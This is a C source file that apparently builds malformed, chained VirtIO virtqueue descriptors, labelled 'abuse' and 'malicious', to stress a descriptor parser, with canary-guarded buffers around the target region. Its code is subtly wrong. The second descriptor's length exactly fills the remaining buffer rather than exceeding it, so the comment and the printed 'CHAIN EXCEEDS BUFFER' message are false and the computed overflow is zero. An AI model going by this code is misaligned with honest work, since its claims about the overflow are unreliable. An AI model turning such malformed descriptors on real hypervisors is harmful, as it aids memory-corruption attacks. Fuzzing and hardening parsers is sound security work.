#define _POSIX_C_SOURCE 200809L
#include "buffer_management.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>

// Global buffer storage
void *normal_buf = NULL;
void *abuse_buf = NULL;
void *guard_region = NULL;
size_t normal_len = 0x1000;   // 4KB
size_t abuse_len = 0x100000;  // 1MB oversized

int allocate_buffers(void) {
    // Allocate normal buffer
    int rc = posix_memalign(&normal_buf, 4096, normal_len);
    if (rc) {
        fprintf(stderr, "posix_memalign failed for normal buffer: %d\n", rc);
        return 1;
    }

    // Allocate oversized buffer with extra space for guard bytes
    size_t total_size = abuse_len + 64; // Extra space for pre/post canaries
    rc = posix_memalign(&guard_region, 4096, total_size);
    if (rc) {
        fprintf(stderr, "posix_memalign failed for abuse buffer: %d\n", rc);
        free(normal_buf);
        return 1;
    }

    // Set abuse_buf to start 32 bytes into the guard region
    abuse_buf = (char*)guard_region + 32;

    // Initialize buffers
    memset(normal_buf, 'A', normal_len);
    memset(abuse_buf, 'B', abuse_len);

    // Set up guard bytes (canaries)
    memset((char*)abuse_buf - 32, 0xAA, 32);  // Pre-canary (32 bytes)
    memset((char*)abuse_buf + abuse_len, 0xBB, 32);  // Post-canary (32 bytes)

    // Lock in memory
    if (mlock(normal_buf, normal_len) != 0) {
        perror("mlock normal_buf");
    }
    if (mlock(guard_region, total_size) != 0) {
        perror("mlock guard_region");
    }

    printf("Allocated buffers:\n");
    printf("  Normal: %zu bytes at %p\n", normal_len, normal_buf);
    printf("  Abuse:  %zu bytes at %p (with guard bytes)\n", abuse_len, abuse_buf);
    printf("  Pre-canary:  %p (32 bytes of 0xAA)\n", (char*)abuse_buf - 32);
    printf("  Post-canary: %p (32 bytes of 0xBB)\n", (char*)abuse_buf + abuse_len);

    return 0;
}

void cleanup_buffers(void) {
    printf("Cleaning up buffers...\n");
    if (normal_buf) {
        munlock(normal_buf, normal_len);
        free(normal_buf);
        normal_buf = NULL;
    }
    if (guard_region) {
        size_t total_size = abuse_len + 64;
        munlock(guard_region, total_size);
        free(guard_region);
        guard_region = NULL;
        abuse_buf = NULL;
    }
}

void create_descriptors(struct virtq_desc *normal_desc, struct virtq_desc *abuse_desc) {
    // Create normal VirtIO descriptor (unchanged)
    *normal_desc = (struct virtq_desc) {
        .addr = (uint64_t)(uintptr_t)normal_buf,
        .len = (uint32_t)normal_len,
        .flags = 0,
        .next = 0
    };

    // Create chained malicious descriptors to stress the parser
    // First descriptor in chain: small 512-byte buffer with NEXT flag
    abuse_desc[0] = (struct virtq_desc) {
        .addr = (uint64_t)(uintptr_t)abuse_buf,
        .len = 512,
        .flags = VIRTQ_DESC_F_NEXT | VIRTQ_DESC_F_WRITE,
        .next = 1
    };
    
    // Second descriptor in chain: massive buffer that exceeds allocated space
    abuse_desc[1] = (struct virtq_desc) {
        .addr = (uint64_t)(uintptr_t)abuse_buf + 512,
        .len = 1048064,  // Nearly 1MB, much larger than remaining buffer space
        .flags = VIRTQ_DESC_F_WRITE,
        .next = 0  // End of chain
    };

    printf("\n[Normal Descriptor]\n");
    printf("  addr:  0x%016lx\n", normal_desc->addr);
    printf("  len:   %u bytes\n", normal_desc->len);
    printf("  flags: 0x%04x (read-only)\n", normal_desc->flags);

    printf("\n[Chained Abuse Descriptors]\n");
    printf("Descriptor 0 (chain head):\n");
    printf("  addr:  0x%016lx\n", abuse_desc[0].addr);
    printf("  len:   %u bytes\n", abuse_desc[0].len);
    printf("  flags: 0x%04x (NEXT | WRITE)\n", abuse_desc[0].flags);
    printf("  next:  %u\n", abuse_desc[0].next);
    
    printf("Descriptor 1 (chain tail):\n");
    printf("  addr:  0x%016lx\n", abuse_desc[1].addr);
    printf("  len:   %u bytes (MASSIVELY OVERSIZED!)\n", abuse_desc[1].len);
    printf("  flags: 0x%04x (WRITE)\n", abuse_desc[1].flags);
    printf("  next:  %u (end of chain)\n", abuse_desc[1].next);
    
    printf("\nTotal chained buffer size: %u bytes\n", abuse_desc[0].len + abuse_desc[1].len);
    printf("Available buffer space: %zu bytes\n", abuse_len - 512);
    printf("*** CHAIN EXCEEDS BUFFER BY %u BYTES ***\n", 
           (abuse_desc[0].len + abuse_desc[1].len) - (uint32_t)abuse_len);
}
